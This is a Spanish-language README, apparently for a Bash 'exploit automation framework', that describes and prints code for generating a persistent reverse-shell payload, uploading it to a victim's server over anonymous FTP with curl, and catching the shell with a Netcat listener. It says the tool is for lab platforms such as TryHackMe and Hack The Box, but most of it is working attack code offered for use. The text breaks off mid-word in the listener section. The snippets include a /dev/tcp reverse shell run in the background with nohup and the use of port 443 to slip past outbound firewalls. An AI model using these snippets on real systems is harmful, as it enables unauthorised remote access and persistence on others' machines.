```markdown
# **Exploit Automation Framework (Bash Pro)**
**Herramienta automatizada para pruebas de penetración y generación de payloads**

---

## **📌 Descripción General**
Este script en **Bash** está diseñado para automatizar el proceso de **generación de payloads maliciosos**, transferencia vía **FTP anónimo** y establecimiento de una **Reverse Shell** con manejo profesional de errores, validación de datos y estabilización de la sesión. Ideal para entornos de *pentesting* como **TryHackMe**, **Hack The Box** o auditorías internas.

---

## **⚙️ Funcionalidades Clave**

### **1️⃣ Detección Automática de IPs**
- **IP Local**: Detecta automáticamente la IP de la interfaz de red activa (`tun0` para VPNs o `eth0` para redes locales).
- **IP de la Víctima**: Solicita al usuario la IP objetivo con validación de formato.
- **Manejo Robusto**: Usa `ip addr` (moderno) en lugar de `ifconfig` (obsoleto).

```bash
ip_local=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
           ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
```

```bash


```

---

### **2️⃣ Validación de Entradas**
- **IP de la Víctima**: Verifica que el formato sea válido (`[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}`).
- **Manejo de Errores**: Si la validación falla, el script se detiene con un mensaje claro.

```bash
if [[ ! $ip_victima =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    log_error "Dirección IP inválida. Abortando."; exit 1
fi
```

---

### **3️⃣ Generación de Payloads Dinámicos**
- **Payload Persistente**: Crea un script (`cleon.sh`) con una **Reverse Shell** que se ejecuta en segundo plano (`nohup`).
- **Puerto Estratégico**: Usa el puerto **443** (HTTPS) para evadir firewalls salientes.

```bash
cat <<EOF > $payload
#!/bin/bash
(nohup bash -i >& /dev/tcp/$ip_local/$lport 0>&1 &) 2>/dev/null
EOF
chmod +x $payload
```

---

### **4️⃣ Transferencia vía FTP Anónimo**
- **Subida Silenciosa**: Usa `curl` con flags `-sS` (silencioso pero informativo) y `--ftp-create-dirs` para crear directorios remotos.
- **Autenticación**: Usa credenciales anónimas (`anonymous:`) para evitar bloqueos.

```bash
if curl -sS --connect-timeout 5 -T "$payload" "ftp://$ip_victima/scripts/$payload" --user "anonymous:"; then
    log_status "Transferencia exitosa: ftp://$ip_victima/scripts/$payload"
else
    log_error "Fallo en la subida. Verifique permisos de escritura en el servidor FTP."
    rm $payload; exit 1
fi
```

---

### **5️⃣ Establecimiento de Listener (Netcat)**
- **Verificación de Depend
